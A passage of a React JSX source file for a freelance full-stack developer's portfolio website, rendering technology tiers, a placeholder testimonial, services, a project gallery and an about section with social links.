            onMouseLeave={e => e.currentTarget.style.opacity = "1"}
          >Become a Client</button>
          <button type="button" onClick={() => onOpenContact("right")} aria-label="Become a client" style={{
            display: "inline-flex", alignItems: "center", justifyContent: "center",
            width: "clamp(52px,4.6vw,74px)", height: "clamp(52px,4.6vw,74px)",
            borderRadius: "50%", background: "#eef2f6", color: "#02060a", flexShrink: 0,
            transition: "opacity 0.2s",
          }}
            onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
            onMouseLeave={e => e.currentTarget.style.opacity = "1"}
          >
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6">
              <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </button>
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ OUR TECHNOLOGIES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Three tiers, each a list of techs. `icon` is a path in /public â€” drop the
// brand logos in and fill it; until then each row shows a lettered placeholder.
const TECH_ICON = n => `/Tech%20SVG/${n}.svg`;
const TECH_TIERS = [
  {
    tier: "Single",
    items: [
      { name: "HTML", icon: TECH_ICON("html") },
      { name: "CSS", icon: TECH_ICON("css") },
      { name: "WordPress", icon: TECH_ICON("wordpress") },
      { name: "Shopify", icon: TECH_ICON("shopify") },
    ],
  },
  {
    tier: "Middle",
    items: [
      { name: "Laravel", icon: TECH_ICON("laravel") },
      { name: "mySQL", icon: TECH_ICON("mysql") },
      { name: "vue", icon: TECH_ICON("vue") },
      { name: "PHP", icon: TECH_ICON("php") },
    ],
  },
  {
    tier: "Enterprise",
    items: [
      { name: "React.js", icon: TECH_ICON("react") },
      { name: "Azure", icon: TECH_ICON("azure") },
      { name: "Python", icon: TECH_ICON("python") },
      { name: "Angular", icon: TECH_ICON("angular") },
      { name: "Node.js", icon: TECH_ICON("nodejs") },
    ],
  },
];

function OurTechnologies() {
  const [ref, inView] = useInView();
  return (
    <section id="our-technologies" style={{ padding: "clamp(60px,8vw,120px) clamp(20px,5vw,60px)" }}>
      <div ref={ref} style={{
        display: "flex", flexWrap: "wrap", gap: "clamp(32px,4vw,64px)",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        {/* Left: heading at the top, copy + CTA pinned to the bottom */}
        <div style={{
          flex: "1 1 340px", minWidth: 280,
          display: "flex", flexDirection: "column", justifyContent: "space-between",
          gap: "clamp(40px,6vw,90px)",
        }}>
          <h2 style={{
            margin: 0,
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(34px,4.6vw,66px)", lineHeight: 1.05,
            letterSpacing: "-0.01em", textTransform: "uppercase", color: "#eef2f6",
            }}>My<br />Technologies</h2>

          <div>
            <p style={{
              margin: "0 0 clamp(18px,2vw,28px)", maxWidth: 380,
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(14px,1.3vw,18px)", lineHeight: 1.6,
              color: "rgba(255,255,255,0.6)",
            }}>A personalized approach to every project â€” for the best results.</p>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <a href="#our-technologies" style={{
                fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
                fontSize: "clamp(11px,1.1vw,13px)", letterSpacing: "0.04em",
                textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
                borderRadius: 999, padding: "clamp(14px,1.4vw,20px) clamp(24px,2.4vw,34px)",
                textDecoration: "none", transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >More Technologies</a>
              <a href="#our-technologies" aria-label="More technologies" style={{
                display: "inline-flex", alignItems: "center", justifyContent: "center",
                width: "clamp(44px,3.6vw,56px)", height: "clamp(44px,3.6vw,56px)",
                borderRadius: "50%", background: "#eef2f6", color: "#02060a", flexShrink: 0,
                transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                  <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </a>
            </div>
          </div>
        </div>

        {/* Right: the three tier columns */}
        <div style={{
          flex: "2 1 560px",
          display: "grid", gridTemplateColumns: "repeat(auto-fit,minmax(180px,1fr))",
          gap: "clamp(20px,2.5vw,44px)",
        }}>
          {TECH_TIERS.map(col => (
            <div key={col.tier}>
              <div style={{
                display: "flex", alignItems: "center", justifyContent: "space-between",
                gap: 12, marginBottom: "clamp(20px,2.4vw,36px)",
                fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
                fontSize: "clamp(17px,1.8vw,26px)", letterSpacing: "0.01em",
                textTransform: "uppercase", color: "#eef2f6",
              }}>
                {col.tier}
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                  strokeWidth="1.3" style={{ flexShrink: 0 }}>
                  <path d="M6 6l12 12M18 8v10H8" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
              {col.items.map(it => (
                <div key={it.name} style={{
                  display: "flex", alignItems: "center", gap: "clamp(12px,1.2vw,18px)",
                  padding: "clamp(14px,1.5vw,22px) 0",
                  borderTop: "1px solid rgba(255,255,255,0.12)",
                }}>
                  {it.icon ? (
                    <img src={it.icon} alt="" style={{
                      width: "clamp(22px,2vw,30px)", height: "clamp(22px,2vw,30px)",
                      objectFit: "contain", flexShrink: 0,
                    }} />
                  ) : (
                    <span aria-hidden="true" style={{
                      width: "clamp(22px,2vw,30px)", height: "clamp(22px,2vw,30px)",
                      borderRadius: 6, border: "1px solid rgba(255,255,255,0.25)",
                      display: "flex", alignItems: "center", justifyContent: "center",
                      fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
                      fontSize: "clamp(10px,0.9vw,13px)", color: "rgba(255,255,255,0.6)",
                      flexShrink: 0,
                    }}>{it.name[0].toUpperCase()}</span>
                  )}
                  <span style={{
                    fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
                    fontSize: "clamp(14px,1.3vw,19px)", color: "#eef2f6",
                  }}>{it.name}</span>
                </div>
              ))}
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ TESTIMONIAL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Author line is a placeholder on purpose â€” swap in a real client's name/role
// once you have one; don't attribute a quote to someone who didn't give it.
function Testimonial() {
  const [ref, inView] = useInView();
  return (
    <section id="testimonial" style={{ padding: "clamp(60px,8vw,120px) clamp(20px,5vw,60px)" }}>
      <div ref={ref} style={{
        display: "flex", flexWrap: "wrap", gap: "clamp(32px,5vw,80px)",
        alignItems: "flex-start",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <img src="/project-power.webp" alt="UAM Power website" style={{
          flex: "1 1 420px", maxWidth: "min(100%, 800px)",
          height: "clamp(240px,32vw,490px)", objectFit: "cover", display: "block",
        }} />

        <div style={{ flex: "1 1 380px", minWidth: 280 }}>
          <div style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 800,
            fontSize: "clamp(40px,4.5vw,64px)", lineHeight: 0.7,
            color: "#e8342a", marginBottom: "clamp(16px,2vw,28px)",
          }} aria-hidden="true">&ldquo;</div>

          <p style={{
            margin: 0,
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(15px,1.5vw,21px)", lineHeight: 1.6,
            color: "#eef2f6",
          }}>
            We delivered an exceptional website representing the client's business
            and services. The site was user-friendly, visually appealing, and
            well-planned. The team's responsibility and cooperation in meeting all
            requirements with precision were remarkable...
          </p>

          <div style={{
            display: "flex", alignItems: "center", gap: "clamp(12px,1.4vw,20px)",
            marginTop: "clamp(18px,2vw,30px)",
            fontFamily: "'Plus Jakarta Sans',sans-serif",
            fontSize: "clamp(13px,1.2vw,17px)",
          }}>
            <span style={{ fontWeight: 700, color: "#eef2f6" }}>Client Name</span>
            <span style={{ width: 1, height: 20, background: "rgba(255,255,255,0.3)" }} />
            <span style={{ fontWeight: 400, color: "rgba(255,255,255,0.75)" }}>Role, Company</span>
          </div>

          <div style={{ marginTop: "clamp(40px,5vw,80px)" }}>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(56px,7vw,104px)", lineHeight: 1,
              letterSpacing: "-0.02em", color: "rgba(255,255,255,0.45)",
            }}>400+</div>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 500,
              fontSize: "clamp(18px,2vw,30px)", letterSpacing: "0.01em",
              textTransform: "uppercase", color: "#eef2f6", marginTop: 8,
            }}>Satisfied Clients</div>
          </div>
        </div>
      </div>
    </section>
  );
}

function Services({ isMobile }) {
  const [ref, inView] = useInView();
  const [openService, setOpenService] = useState(null);

  return (
    <section id="services" style={{
      padding: "0 clamp(20px,5vw,60px) clamp(70px,10vw,140px)",
      scrollMarginTop: "clamp(100px,12vw,150px)",
    }}>
      <div ref={ref} style={{
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        {/* Big heading, like the reference */}
        <h2 style={{
          margin: 0,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(40px,7vw,110px)", lineHeight: 1,
          letterSpacing: "-0.01em", textTransform: "uppercase", color: "#eef2f6",
        }}>Services</h2>
        <div style={{ marginTop: "clamp(32px,5vw,64px)" }}>
          {SERVICES_LIST.map(s => (
            <ServiceRow
              key={s.id}
              s={s}
              open={openService === s.id}
              onToggle={() => setOpenService(openService === s.id ? null : s.id)}
            />
          ))}
        </div>
      </div>
    </section>
  );
}

function Work({ isMobile }) {
  const [ref, inView] = useInView();

  // Ticks up one per half-second: starts at 120, and every time it hits 200 it
  // restarts from 140. Only runs while the section is on screen.
  const [count, setCount] = useState(120);
  useEffect(() => {
    if (!inView) return;
    const id = setInterval(() => setCount(c => (c >= 200 ? 140 : c + 1)), 1000);
    return () => clearInterval(id);
  }, [inView]);

  return (
    <section id="work" style={{ padding: "clamp(28px,10vw,140px) clamp(20px,5vw,60px) 0" }}>
      <div ref={ref} style={{
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        {/* Intro sentence with the CTA sitting inline inside the line */}
        <div style={{
          display: "flex", alignItems: "center", flexWrap: "wrap",
          gap: "clamp(10px,1.2vw,18px)",
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(20px,3vw,44px)", letterSpacing: "-0.02em",
          color: "rgba(255,255,255,0.45)",
        }}>
          <span>All my projects</span>
          <a href="#become-client" style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 600,
            fontSize: "clamp(11px,1.1vw,15px)", letterSpacing: "0.02em",
            textTransform: "uppercase", color: "#eef2f6",
            background: "rgba(255,255,255,0.12)", borderRadius: 999,
            padding: "clamp(10px,1vw,16px) clamp(18px,1.8vw,30px)",
            textDecoration: "none", whiteSpace: "nowrap",
            transition: "background 0.25s ease",
          }}
            onMouseEnter={e => e.currentTarget.style.background = "rgba(255,255,255,0.2)"}
            onMouseLeave={e => e.currentTarget.style.background = "rgba(255,255,255,0.12)"}
          >Create New</a>
          <a href="#become-client" aria-label="Start a project" style={{
            display: "inline-flex", alignItems: "center", justifyContent: "center",
            width: "clamp(38px,3.4vw,58px)", height: "clamp(38px,3.4vw,58px)",
            borderRadius: "50%", background: "rgba(255,255,255,0.12)",
            color: "#eef2f6", flexShrink: 0, transition: "background 0.25s ease",
          }}
            onMouseEnter={e => e.currentTarget.style.background = "rgba(255,255,255,0.2)"}
            onMouseLeave={e => e.currentTarget.style.background = "rgba(255,255,255,0.12)"}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
              <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </a>
          <span>are delivered with quality.</span>
        </div>

        {/* Big heading with the brand card sitting inline between the words */}
        <h2 id="work-proud" style={{
          display: "flex", alignItems: "center", flexWrap: "wrap",
          gap: "clamp(12px,1.6vw,28px)", margin: "clamp(28px,4vw,56px) 0 0",
          scrollMarginTop: "clamp(100px,12vw,150px)",
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 800,
          fontSize: "clamp(34px,6vw,76px)", lineHeight: 0.94,
          letterSpacing: "-0.035em", textTransform: "uppercase", color: "#eef2f6",
        }}>
          <span>I Am</span>
          <span style={{
            display: "inline-flex", flexDirection: "column", justifyContent: "center",
            background: "#eef2f6", color: "#02060a",
            width: "clamp(96px,11vw,150px)", height: "clamp(58px,6.4vw,88px)",
            fontFamily: "'Plus Jakarta Sans',sans-serif", lineHeight: 1,
            textTransform: "none", flexShrink: 0,
          }}>
            <span style={{
              fontWeight: 800, fontSize: "clamp(16px,1.8vw,24px)",
              letterSpacing: "-0.02em", textAlign: "center",
            }}>Aqib Faraz</span>
          </span>
          <span>Proud</span>
        </h2>

        {/* Masonry: 3 columns, each card as tall as its own cover image, so the
            columns stagger naturally. 6 projects â†’ 3 on top, 3 below. */}
        <div style={{
          marginTop: "clamp(36px,6vw,72px)",
          columnCount: isMobile ? 1 : 3,
          columnGap: "clamp(8px,1vw,14px)",
        }}>
          {PROJECTS.map((p, i) => <WorkCard key={p.id} p={p} i={i} inView={inView} />)}
        </div>

        {/* More-projects strip: count on the left, CTA + thumbnails on the right */}
        <div style={{
          marginTop: "clamp(52px,6.5vw,96px)",
          paddingTop: "clamp(32px,4vw,60px)",
          paddingBottom: "clamp(20px,3vw,40px)",
          borderTop: "1px solid rgba(255,255,255,0.14)",
          display: "flex", alignItems: "flex-start", justifyContent: "space-between",
          flexWrap: "wrap", gap: "clamp(24px,3vw,48px)",
        }}>
          <div style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(34px,4.4vw,62px)", letterSpacing: "0.01em",
            color: "#eef2f6",
          }}>({count})</div>

          <div>
            <a href="#work" style={{
              display: "flex", alignItems: "center", gap: "clamp(10px,1.4vw,22px)",
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(34px,4.4vw,62px)", letterSpacing: "-0.01em",
              textTransform: "uppercase", color: "#eef2f6", textDecoration: "none",
              transition: "opacity 0.25s ease",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.6"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >
              More Projects
              <svg width="46" height="24" viewBox="0 0 46 24" fill="none" stroke="currentColor" strokeWidth="1.6" style={{ flexShrink: 0 }}>
                <path d="M45 12H2M13 3 2 12l11 9" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </a>
            {/* Thumbnails slide left forever, clipped to this strip. The list is
                duplicated so the -50% loop point is seamless. */}
            <div style={{
              marginTop: "clamp(12px,1.4vw,20px)",
              width: "clamp(340px,40vw,600px)",
              overflow: "hidden",
            }}>
              <div style={{
                display: "flex", gap: 4, width: "max-content",
                animation: "marqueeLeft 22s linear infinite",
              }}>
                {[...PROJECTS, ...PROJECTS].map((p, idx) => (
                  <img key={idx} src={p.image} alt={p.title} style={{
                    width: "clamp(90px,11vw,152px)", height: "clamp(56px,7vw,96px)",
                    objectFit: "cover", display: "block", flexShrink: 0,
                  }} />
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ STACK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// â”€â”€â”€ TECHNOLOGIES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// `menu.layout` is column-major: each column stacks its own
// blocks (a labelled bullet list, or a bare heading with no items) top to bottom.
function Technologies({ isMobile }) {
  const [ref, inView] = useInView();
  const menu = TECHNOLOGY_MENU;

  return (
    <section id="stack" style={{ padding: "clamp(70px,10vw,140px) clamp(20px,5vw,60px)" }}>
      <div ref={ref} style={{
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <SectionLabel num="04" title="Technologies" />
        <div style={{
          marginTop: "clamp(36px,6vw,72px)",
          background: "#fff", borderRadius: 20, overflow: "hidden",
          display: "flex", flexWrap: "wrap",
        }}>
          {/* Sidebar */}
          <div style={{
            width: "clamp(240px,22vw,300px)", flexShrink: 0,
            padding: "clamp(32px,4vw,52px) clamp(28px,3vw,40px)",
            display: "flex", flexDirection: "column", justifyContent: "space-between", gap: 60,
            borderRight: isMobile ? "none" : "1px solid rgba(2,6,10,0.1)",
            borderBottom: isMobile ? "1px solid rgba(2,6,10,0.1)" : "none",
          }}>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(26px,3vw,34px)", letterSpacing: "0.02em",
              textTransform: "uppercase", color: "#02060a",
            }}>{menu.title}</div>
            <p style={{
              margin: 0, fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 15,
              lineHeight: 1.6, color: "rgba(2,6,10,0.6)", maxWidth: 220,
            }}>I develop online stores, CRM systems, SaaS platforms, and apps â€” integrating AI into processes and solutions.</p>
          </div>

          {/* Main technologies â€” column-major: each column stacks its own blocks */}
          <div style={{
            flex: 1, minWidth: 280, padding: "clamp(32px,4vw,52px) clamp(28px,3.5vw,48px)",
            display: "grid", gridTemplateColumns: "repeat(auto-fit,minmax(170px,1fr))",
            gap: "40px 32px", alignContent: "start",
          }}>
            {menu.layout.map((column, colI) => (
              <div key={colI} style={{ display: "flex", flexDirection: "column", gap: "clamp(32px,4vw,48px)" }}>
                {column.map((block, blockI) => (
                  <div key={blockI}>
                    {block.items.length > 0 ? (
                      <>
                        <div style={{
                          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700, fontSize: 12,
                          letterSpacing: "0.08em", textTransform: "uppercase",
                          color: "rgba(2,6,10,0.4)", marginBottom: 16,
                        }}>{block.heading}</div>
                        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                          {block.items.map(it => (
                            <a key={it.label} href={it.href} style={{
                              display: "flex", alignItems: "flex-start", gap: 10,
                              fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14,
                              fontWeight: 500, letterSpacing: "0.01em", textTransform: "uppercase",
                              color: "#02060a", textDecoration: "none", lineHeight: 1.35,
                              transition: "opacity 0.2s",
                            }}
                              onMouseEnter={e => e.currentTarget.style.opacity = "0.55"}
                              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                            >
                              <span style={{ width: 5, height: 5, borderRadius: "50%", marginTop: 6, border: "1px solid rgba(2,6,10,0.4)", flexShrink: 0 }} />
                              {it.label}
                            </a>
                          ))}
                        </div>
                        {block.pill && (
                          <span style={{
                            display: "inline-block", marginTop: 16,
                            fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 12, fontWeight: 500,
                            color: "rgba(2,6,10,0.55)", background: "rgba(2,6,10,0.06)",
                            borderRadius: 999, padding: "6px 14px",
                          }}>{block.pill}</span>
                        )}
                      </>
                    ) : (
                      <a href="#stack" style={{
                        fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 800,
                        fontSize: "clamp(18px,2.2vw,25px)", letterSpacing: "-0.01em", textTransform: "uppercase",
                        color: "#02060a", textDecoration: "none", transition: "opacity 0.2s",
                      }}
                        onMouseEnter={e => e.currentTarget.style.opacity = "0.55"}
                        onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                      >{block.heading}</a>
                    )}
                  </div>
                ))}
              </div>
            ))}
          </div>

          {/* Featured project panel â€” full column height via flex stretch */}
          <div style={{
            width: "clamp(240px,26vw,340px)", flexShrink: 0,
            background: "#333", padding: "clamp(28px,3.5vw,44px)",
            display: "flex", flexDirection: "column", gap: 20,
          }}>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700, fontSize: 17,
              letterSpacing: "0.02em", textTransform: "uppercase", color: "#eef2f6",
            }}>New Project</div>
            <div style={{ flex: 1, minHeight: 260, borderRadius: 10, overflow: "hidden", background: "#1a1a1a" }}>
              <img src="/Coolag.png" alt="Latest project preview" style={{
                width: "100%", height: "100%", objectFit: "cover", display: "block",
              }} />
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ ABOUT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function About() {
  const [ref, inView] = useInView();

  return (
    <section id="about" style={{
      padding: "clamp(70px,10vw,140px) clamp(20px,5vw,60px)",
      borderTop: "1px solid rgba(255,255,255,0.07)",
    }}>
      <div ref={ref} style={{
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <SectionLabel num="05" title="About" />

        <div style={{
          marginTop: "clamp(36px,6vw,72px)",
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))",
          gap: "clamp(36px,6vw,80px)",
          alignItems: "start",
        }}>

          {/* LEFT: Photo + bio */}
          <div style={{ display: "flex", flexDirection: "column", gap: 32 }}>

            {/* Photo Card */}
            <div style={{ position: "relative", alignSelf: "center" }}>
              {/* Corner accents */}
              <div style={{
                position: "absolute", top: -8, left: -8, width: 28, height: 28,
                borderTop: "2px solid #f3f3f3", borderLeft: "2px solid #f3f3f3", zIndex: 2,
              }} />
              <div style={{
                position: "absolute", bottom: -8, right: -8, width: 28, height: 28,
                borderBottom: "2px solid #f3f3f3", borderRight: "2px solid #f3f3f3", zIndex: 2,
              }} />
              <div style={{
                position: "absolute", top: -8, right: -8, width: 28, height: 28,
                borderTop: "2px solid rgba(255,255,255,0.3)", borderRight: "2px solid rgba(255,255,255,0.3)", zIndex: 2,
              }} />
              <div style={{
                position: "absolute", bottom: -8, left: -8, width: 28, height: 28,
                borderBottom: "2px solid rgba(255,255,255,0.3)", borderLeft: "2px solid rgba(255,255,255,0.3)", zIndex: 2,
              }} />

              {/* Glow behind image */}
              <div style={{
                position: "absolute", inset: -1,
                background: "linear-gradient(135deg, rgba(255,255,255,0.08), transparent 60%)",
                zIndex: 0,
              }} />

              <img
                src={aqibPhoto}
                alt="Aqib Faraz"
                style={{
                  width: "clamp(200px,28vw,320px)",
                  height: "clamp(240px,34vw,380px)",
                  objectFit: "cover",
                  objectPosition: "top center",
                  display: "block",
                  position: "relative", zIndex: 1,
                  filter: "grayscale(20%) contrast(1.05)",
                  transition: "filter 0.4s ease",
                }}
                onMouseEnter={e => e.target.style.filter = "grayscale(0%) contrast(1.1)"}
                onMouseLeave={e => e.target.style.filter = "grayscale(20%) contrast(1.05)"}
              />

              {/* Status badge over image */}
              <div style={{
                position: "absolute", bottom: 16, left: 16, right: 16,
                background: "rgba(2,6,10,0.85)", backdropFilter: "blur(8px)",
                border: "1px solid rgba(255,255,255,0.2)",
                padding: "10px 14px", zIndex: 3,
                display: "flex", alignItems: "center", gap: 8,
              }}>
                <span style={{
                  width: 7, height: 7, borderRadius: "50%", background: "#f3f3f3",
                  boxShadow: "0 0 10px rgba(255,255,255,0.35)", display: "inline-block",
                  animation: "pulse 2s ease-in-out infinite", flexShrink: 0,
                }} />
                <span style={{
                  fontFamily: "'Space Mono',monospace", fontSize: 9,
                  letterSpacing: "0.2em", color: "#f3f3f3", textTransform: "uppercase",
                }}>Available for remote work</span>
              </div>
            </div>

            {/* Social Links â€” inline icons */}
            <div style={{ display: "flex", justifyContent: "center", gap: "clamp(8px,2vw,12px)", flexWrap: "wrap" }}>
              {[
                {
                  label: "LinkedIn",
                  href: "https://www.linkedin.com/in/aqib-faraz-99848638b/",
                  icon: (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
                    </svg>
                  ),
                },
                {
                  label: "GitHub",
                  href: "https://github.com/aqibfaraz?tab=repositories",
                  icon: (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
                    </svg>
                  ),
                },
                {
                  label: "Email",
                  href: "mailto:Aqibfahraz@gmail.com",
                  icon: (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
                    </svg>
                  ),
                },
              ].map(x => (
                <a key={x.label} href={x.href} target="_blank" rel="noreferrer" style={{
                  display: "inline-flex", alignItems: "center", justifyContent: "center",
                  width: "clamp(38px,9vw,48px)", height: "clamp(38px,9vw,48px)",
                    border: "1px solid rgba(255,255,255,0.16)",
                  color: "rgba(255,255,255,0.5)",
                  textDecoration: "none",
                  transition: "all 0.25s ease",
                  background: "transparent",
                  borderRadius: "4px",
                }}
                  onMouseEnter={e => {
                    e.currentTarget.style.color = "#929292";
                    e.currentTarget.style.borderColor = "rgba(255,255,255,0.42)";
                    e.currentTarget.style.background = "rgba(255,255,255,0.06)";
                  }}
                  onMouseLeave={e => {
                    e.currentTarget.style.color = "rgba(255,255,255,0.5)";
                    e.currentTarget.style.borderColor = "rgba(255,255,255,0.16)";
                    e.currentTarget.style.background = "transparent";
                  }}
                  title={x.label}
                >
                  {x.icon}
                </a>
              ))}
            </div>
          </div>

          {/* RIGHT: Bio + availability card */}
          <div style={{ display: "flex", flexDirection: "column", gap: 32 }}>
            <div>
              <p style={{
                fontFamily: "'Space Mono',monospace",
                fontSize: "clamp(11px,1.2vw,13px)", lineHeight: 2.1,
                color: "rgba(255,255,255,0.42)",
              }}>
                Full-stack developer from Karachi building scalable web & mobile apps for
                USA and Europe-based clients â€” fully remote, zero timezone excuses.
              </p>
              <p style={{
                fontFamily: "'Space Mono',monospace",
                fontSize: "clamp(11px,1.2vw,13px)", lineHeight: 2.1,
                color: "rgba(255,255,255,0.42)", marginTop: 18,
              }}>
                I specialise in MERN stack, Python automation, AI/ML pipelines,
                and cross-platform Flutter apps. I don't just write code â€”
                I solve the business problem behind the ticket.
              </p>
            </div>

            {/* Availability card */}
            <div style={{
              border: "1px solid rgba(255,255,255,0.14)",
              padding: "clamp(24px,4vw,40px) clamp(20px,3vw,36px)",
              position: "relative", overflow: "hidden",
            }}>
